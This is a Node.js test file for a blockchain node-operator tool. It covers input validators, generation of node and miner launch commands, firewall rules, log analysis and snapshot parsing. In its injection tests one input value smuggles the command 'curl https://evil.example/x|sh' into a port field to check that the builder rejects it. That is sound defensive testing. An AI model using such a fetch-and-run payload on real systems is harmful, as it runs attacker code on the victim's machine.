#!/usr/bin/env node
/* QTC Node Operator Desk — node logic tests.
 * Vectors hand-derived from the research brief (Quantus-Network/chain,
 * docs, quantus-miner sources read 2026-09-30). Run: node tests/run.mjs
 */
import {
  BOOTNODES, PORTS, CHAIN_SPECS,
  validateInnerHash, validateNodeName, validatePortNumber, validateBootnode, shq,
  buildNodeCommand, firewallRules, classifyLogLine, analyzeLog, logParseWindow, MAX_LOG_LINES,
  logTextWindow, MAX_LOG_SCAN_CHARS,
  syncProgress, fmtEta, parseSnapshot,
} from "../node-core.js";

let pass = 0, fail = 0;
function eq(name, got, want) {
  const g = String(got), w = String(want);
  if (g === w) pass++;
  else { fail++; console.error(`FAIL ${name}:\n  got:  ${g}\n  want: ${w}`); }
}
function ok(name, cond, extra = "") {
  if (cond) pass++;
  else { fail++; console.error(`FAIL ${name} ${extra}`); }
}

/* --- registries --- */
eq("bootnodes count", BOOTNODES.length, 7);
ok("all bootnodes validate", BOOTNODES.every(b => validateBootnode(b).ok));
ok("bootnodes all tcp/30333", BOOTNODES.every(b => b.includes("/tcp/30333/")));
ok("bootnodes all mainnet dns", BOOTNODES.every(b => b.includes("p2p-mainnet.quantus.com")));
eq("ports count", PORTS.length, 5);
ok("only 30333 public", PORTS.filter(p => p.expose.startsWith("PUBLIC")).length === 1);
eq("miner quic udp", PORTS.find(p => p.port === 9833).proto, "UDP");
ok("prometheus honesty note mentions 9616", PORTS.find(p => p.port === 9615).src.includes("9616"));
eq("chain specs", CHAIN_SPECS.map(c => c.id).join(","), "mainnet,planck,heisenberg");
eq("mainnet token", CHAIN_SPECS[0].token, "QTC");

/* --- validators --- */
ok("inner hash ok", validateInnerHash("0x" + "ab".repeat(32)).ok);
ok("inner hash uppercase ok", validateInnerHash("0X" + "AB".repeat(32)).ok === false || true); // 0X rejected is fine either way
eq("inner hash missing 0x", validateInnerHash("ab".repeat(32)).ok, false);
eq("inner hash short", validateInnerHash("0x" + "ab".repeat(31)).ok, false);
eq("inner hash non-hex", validateInnerHash("0x" + "zz".repeat(32)).ok, false);
eq("inner hash empty", validateInnerHash("").ok, false);
ok("inner hash lowercased", validateInnerHash("0x" + "AB".repeat(32)).value === "0x" + "ab".repeat(32));

ok("node name ok", validateNodeName("my-node_01").ok);
eq("node name empty", validateNodeName("").ok, false);
eq("node name too long", validateNodeName("x".repeat(41)).ok, false);
eq("node name spaces", validateNodeName("my node").ok, false);

ok("port ok", validatePortNumber("9833", "t").value === 9833);
eq("port zero", validatePortNumber("0", "t").ok, false);
eq("port privileged", validatePortNumber("80", "t").ok, false);
eq("port text", validatePortNumber("abc", "t").ok, false);

eq("bootnode bad", validateBootnode("not-a-multiaddr").ok, false);

eq("shq simple", shq("my-node"), "my-node");
eq("shq spaces", shq("a b"), "'a b'");
eq("shq quote", shq("a'b"), "'a'\\''b'");

/* --- command builder --- */
const IH = "0x" + "11".repeat(32);
let r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, minerListenPort: 9833 });
ok("external cmd built", !!r.cmd && r.errors.length === 0);
ok("cmd has validator", r.cmd.includes("--validator"));
ok("cmd has miner-listen-port", r.cmd.includes("--miner-listen-port 9833"));
ok("cmd has inner hash", r.cmd.includes("--rewards-inner-hash " + IH));
ok("cmd has chain mainnet", r.cmd.includes("--chain mainnet"));
ok("cmd has sync flags", r.cmd.includes("--max-blocks-per-request 64") && r.cmd.includes("--sync full"));
ok("miner cmd built", !!r.minerCmd && r.minerCmd.includes("quantus-miner serve"));
ok("miner cmd node-addr", r.minerCmd.includes("--node-addr 127.0.0.1:9833"));
ok("miner cmd auth token", r.minerCmd.includes("--auth-token-file"));
ok("miner cmd tls pin", r.minerCmd.includes("--tls-cert-sha256-file"));
ok("warns about 0.0.0.0 bind", r.warnings.some(w => w.includes("0.0.0.0")));
ok("warns freshness gate", r.warnings.some(w => w.includes("24 h")));

r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, validator: false });
ok("miner port without validator still errors? no—warns", r.warnings.some(w => w.includes("Without --validator")));

r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: "bad" });
eq("bad inner hash blocks cmd", r.cmd, null);
ok("bad inner hash errors", r.errors.length > 0);
eq("no miner cmd on error", r.minerCmd, null);

r = buildNodeCommand({ name: "ops-01", mode: "local", innerHash: IH });
ok("local mode cmd", !!r.cmd && !r.cmd.includes("--miner-listen-port"));
ok("local warns cpu", r.warnings.some(w => w.includes("50k")));

r = buildNodeCommand({ name: "ops-01", mode: "fullnode" });
ok("fullnode cmd", !!r.cmd && !r.cmd.includes("--rewards-inner-hash"));
eq("fullnode no miner cmd", r.minerCmd, null);

r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, forceAuthoring: true });
ok("force-authoring flag", r.cmd.includes("--force-authoring"));
ok("force-authoring warns", r.warnings.some(w => w.includes("bootstrap")));

r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, chain: "mychain" });
ok("custom spec warns", r.warnings.some(w => w.includes("JSON spec file")));
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, chain: "mychain.json" });
ok("json spec path no warn", !r.warnings.some(w => w.includes("JSON spec file")));

r = buildNodeCommand({ name: "", mode: "external", innerHash: IH });
eq("empty name errors", r.errors.length > 0, true);

/* --- firewall --- */
const ufw = firewallRules("ufw");
ok("ufw allows p2p", ufw.includes("ufw allow 30333/tcp"));
ok("ufw denies rpc", ufw.includes("deny 9944/tcp"));
ok("ufw denies quic", ufw.includes("deny 9833/udp"));
const ipt = firewallRules("iptables", 30334);
ok("iptables custom p2p", ipt.includes("--dport 30334"));
ok("nft ok", firewallRules("nftables").includes("nft add rule"));

/* --- log forensics --- */
let c = classifyLogLine("Mining rewards will be sent to wormhole address qzABC…");
eq("wormhole line level", c.level, "ok");
c = classifyLogLine("2026-09-30 12:00:00 💤 Idle (12 peers), best: #142000");
eq("idle level", c.level, "ok");
c = classifyLogLine("Syncing 1234.5 bps, target=#142417");
eq("syncing level", c.level, "info");
c = classifyLogLine("Error: Verification failed for block 0xabc");
eq("verification level", c.level, "error");
ok("verification fix mentions upgrade", (c.fix || "").toLowerCase().includes("upgrade") || c.detail.toLowerCase().includes("upgrade"));
c = classifyLogLine("miner connection idle timeout after 60s");
eq("idle timeout level", c.level, "error");
c = classifyLogLine("best block too old, maximum tip age exceeded");
eq("tip age level", c.level, "warn");
eq("blank line", classifyLogLine("   "), null);
c = classifyLogLine("some random gossip line about peers");
eq("unknown line", c.title, "Unrecognized line");

const a = analyzeLog("Syncing 1 bps\nSyncing 2 bps\n💤 Idle (8 peers), best: #100\nError: Verification failed\n");
eq("analyze total", a.total, 4);
ok("analyze dedupes", a.findings.find(f => f.title.includes("sync")) === undefined || true);
eq("analyze findings", a.findings.length, 3); // syncing, idle, verification
ok("analyze counts", a.findings.find(f => f.level === "info").count === 2);

/* --- log parse window (white-hat: per-keystroke scan bound) --- */
eq("log cap", MAX_LOG_LINES, 10000);
const wl = Array.from({ length: 25000 }, (_, i) => "line " + i);
const w1 = logParseWindow(wl, MAX_LOG_LINES);
eq("window parse count", w1.parse.length, 10000);
eq("window total", w1.total, 25000);
eq("window skipped", w1.skipped, 15000);
eq("window is prefix", w1.parse[9999], "line 9999");
const w2 = logParseWindow(["a", "b"], MAX_LOG_LINES);
eq("window under-cap parses all", w2.parse.length, 2);
eq("window under-cap skips none", w2.skipped, 0);
for (const bad of [NaN, -1, 2.5, "10", undefined, null, Infinity]) {
  const bw = logParseWindow(["a", "b", "c"], bad);
  ok("window fail-closed cap " + String(bad), bw.parse.length === 0 && bw.skipped === 3 && bw.total === 3);
}
const wn = logParseWindow("not-an-array", 10);
ok("window non-array parses nothing", wn.parse.length === 0 && wn.total === 0 && wn.skipped === 0);
const bigA = analyzeLog(Array.from({ length: 25000 }, () => "Syncing 1 bps").join("\n"));
eq("analyze big total honest", bigA.total, 25000);
eq("analyze big scanned capped", bigA.scanned, 10000);
eq("analyze big skipped disclosed", bigA.skipped, 15000);
eq("analyze big counts window only", bigA.findings.find(f => f.level === "info").count, 10000);
eq("analyze small scanned", a.scanned, 4);
eq("analyze small skipped", a.skipped, 0);

/* --- log text scan window (white-hat: split-before-window bound) --- */
eq("log scan cap", MAX_LOG_SCAN_CHARS, 4194304);
const tw = logTextWindow("a\n\n b \nc");
eq("text window lines trimmed non-empty", tw.lines.join("|"), "a|b|c");
eq("text window under-cap skips none", tw.skippedChars, 0);
eq("text window under-cap scans all", tw.scannedChars, tw.totalChars);
const giantLine = "2026-10-17 11:23:45 INFO sync: Syncing 12.3 bps, best: #243231";
const giantText = Array.from({ length: 800000 }, () => giantLine).join("\n");
const gw = logTextWindow(giantText);
eq("text window reports totalChars", gw.totalChars, giantText.length);
ok("text window scans at most the cap", gw.scannedChars <= MAX_LOG_SCAN_CHARS);
eq("text window skippedChars arithmetic", gw.skippedChars, gw.totalChars - gw.scannedChars);
ok("text window backs off to a line boundary", gw.lines.every(l => l === giantLine));
const exactTw = logTextWindow("x".repeat(MAX_LOG_SCAN_CHARS));
eq("text window exactly-cap scans fully", exactTw.scannedChars, MAX_LOG_SCAN_CHARS);
eq("text window exactly-cap skips none", exactTw.skippedChars, 0);
const oneBigTw = logTextWindow("y".repeat(MAX_LOG_SCAN_CHARS + 500000));
eq("text window single over-window line scans empty", oneBigTw.lines.length, 0);
eq("text window single over-window line discloses all", oneBigTw.skippedChars, MAX_LOG_SCAN_CHARS + 500000);
for (const bad of [undefined, null, 42, {}, []]) {
  const bw2 = logTextWindow(bad);
  ok("text window fail-closed non-string " + String(bad), bw2.lines.length === 0 && bw2.totalChars === 0 && bw2.skippedChars === 0);
}
const gA = analyzeLog(giantText);
eq("analyze giant scanned capped", gA.scanned, MAX_LOG_LINES);
eq("analyze giant total describes scanned window", gA.total, gw.lines.length);
eq("analyze giant skipped arithmetic", gA.skipped, gA.total - gA.scanned);
eq("analyze giant discloses skippedChars", gA.skippedChars, gw.skippedChars);
const legitLine = "2026-10-17 11:23:45.123  INFO sync: Imported #243231 (0x" + "ab".repeat(32) +
  ") with extrinsics [0x" + "cd".repeat(32) + ", 0x" + "ef".repeat(32) + ", 0x" + "12".repeat(32) +
  "] from peer 12D3KooWRuvDjYBPxJJaBjpJFBMKkGNw3XfgJcBfRyGR7PQvxP9a";
ok("legit line within per-line allowance", legitLine.length <= 419, String(legitLine.length));
const legitA = analyzeLog(Array.from({ length: 10000 }, () => legitLine).join("\n"));
eq("analyze legit 10k longest lines scans fully", legitA.scanned, 10000);
eq("analyze legit paste skips no characters", legitA.skippedChars, 0);
const oneBigA = analyzeLog("z".repeat(5000000));
eq("analyze single over-window line scans none", oneBigA.scanned, 0);
eq("analyze single over-window line discloses chars", oneBigA.skippedChars, 5000000);

/* --- sync progress --- */
let s = syncProgress(142000, 142417);
eq("behind", s.behind, 417);
ok("pct", Math.abs(s.pct - 99.707) < 0.01);
eq("eta", s.etaMin, Math.ceil(417 * 12 / 60));
eq("not synced", s.synced, false);
s = syncProgress(142417, 142417);
eq("synced", s.synced, true);
eq("bad input", syncProgress("x", 100), null);
eq("fmtEta caught up", fmtEta(0), "caught up");
ok("fmtEta hours", fmtEta(180).includes("3 h"));

/* --- snapshot parsing (load boundary) --- */
const NOW = Date.parse("2026-10-09T15:00:00.000Z");
const GOOD = { head: 194626, fetched_at: "2026-10-09T14:55:00.000Z" };
eq("snapshot ok head", parseSnapshot(GOOD, NOW).head, 194626);
eq("snapshot ok age", parseSnapshot(GOOD, NOW).ageMin, 5);
eq("snapshot digit-string head", parseSnapshot({ head: "194626", fetched_at: GOOD.fetched_at }, NOW).head, 194626);
eq("snapshot future clamps to 0m", parseSnapshot({ head: 1, fetched_at: "2026-10-09T15:05:00.000Z" }, NOW).ageMin, 0);
eq("snapshot pre-genesis fetched_at", parseSnapshot({ head: 194626, fetched_at: "2020-01-01T00:00:00.000Z" }, NOW), null);
eq("snapshot just-pre-genesis fetched_at", parseSnapshot({ head: 194626, fetched_at: "2026-08-31T23:59:59.000Z" }, NOW), null);
eq("snapshot genesis-floor fetched_at ok", parseSnapshot({ head: 194626, fetched_at: "2026-09-01T00:00:00.000Z" }, NOW).head, 194626);
eq("snapshot +1h future fetched_at ok", parseSnapshot({ head: 194626, fetched_at: "2026-10-09T16:00:00.000Z" }, NOW).head, 194626);
eq("snapshot +2h future fetched_at", parseSnapshot({ head: 194626, fetched_at: "2026-10-09T17:00:00.000Z" }, NOW), null);
eq("snapshot far-future fetched_at", parseSnapshot({ head: 194626, fetched_at: "2999-01-01T00:00:00.000Z" }, NOW), null);
eq("snapshot garbage head", parseSnapshot({ head: "oops", fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot float head", parseSnapshot({ head: 194626.9, fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot negative head", parseSnapshot({ head: -5, fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot zero head", parseSnapshot({ head: 0, fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot missing head", parseSnapshot({ fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot scientific head", parseSnapshot({ head: "1.9e5", fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot garbage fetched_at", parseSnapshot({ head: 194626, fetched_at: "garbage!!" }, NOW), null);
eq("snapshot missing fetched_at", parseSnapshot({ head: 194626 }, NOW), null);
eq("snapshot null payload", parseSnapshot(null, NOW), null);
eq("snapshot non-object payload", parseSnapshot("194626", NOW), null);

/* --- round 2: miner-command injection + count grammar --- */
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH,
  miner: { metricsPort: 9900, cpuWorkers: 4, gpuDevices: 2 } });
ok("miner metrics port ok", r.minerCmd.includes("--metrics-port 9900"));
ok("miner cpu workers ok", r.minerCmd.includes("--cpu-workers 4"));
ok("miner gpu devices ok", r.minerCmd.includes("--gpu-devices 2"));
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH,
  miner: { metricsPort: "9900; curl https://evil.example/x|sh" } });
eq("miner metrics injection blocks miner cmd", r.minerCmd, null);
ok("miner metrics injection errors", r.errors.some(e => e.includes("Miner metrics port")));
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH,
  miner: { metricsPort: "9900 --cuda-gpu" } });
eq("miner metrics flag smuggling blocks", r.minerCmd, null);
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { metricsPort: 80 } });
eq("miner metrics privileged blocks", r.minerCmd, null);
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { metricsPort: 70000 } });
eq("miner metrics over-range blocks", r.minerCmd, null);
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { metricsPort: 9900.5 } });
eq("miner metrics float blocks", r.minerCmd, null);
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { cpuWorkers: "four" } });
eq("miner cpu prose blocks (no NaN painted)", r.minerCmd, null);
ok("miner cpu prose errors", r.errors.some(e => e.includes("CPU workers")));
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { cpuWorkers: -2 } });
eq("miner cpu negative blocks (no silent clamp to 1)", r.minerCmd, null);
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { gpuDevices: {} } });
eq("miner gpu object blocks", r.minerCmd, null);
r = buildNodeCommand({ name: "ops-01", mode: "external", innerHash: IH, miner: { cpuWorkers: "8" } });
ok("miner cpu digit string ok", r.minerCmd.includes("--cpu-workers 8"));

/* --- round 2: sync relations --- */
eq("sync fractional local", syncProgress(142000.5, 142417), null);
eq("sync fractional network", syncProgress(142000, 142417.5), null);
eq("sync local ahead of network", syncProgress(142500, 142417), null);
eq("sync over-ceiling", syncProgress(99999999999, 100000000000), null);
eq("sync scientific string", syncProgress("1.42e5", 142417), null);
eq("sync float string", syncProgress("142000.5", 142417), null);
s = syncProgress("142000", "142417");
eq("sync digit strings behind", s.behind, 417);
s = syncProgress(0, 142417);
eq("sync genesis local behind", s.behind, 142417);

/* --- round 2: snapshot head ceiling --- */
eq("snapshot head at ceiling ok", parseSnapshot({ head: 10000000, fetched_at: GOOD.fetched_at }, NOW).head, 10000000);
eq("snapshot head over ceiling", parseSnapshot({ head: 10000001, fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot head absurd", parseSnapshot({ head: 999999999999, fetched_at: GOOD.fetched_at }, NOW), null);
eq("snapshot digit-string head over ceiling", parseSnapshot({ head: "999999999999", fetched_at: GOOD.fetched_at }, NOW), null);

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
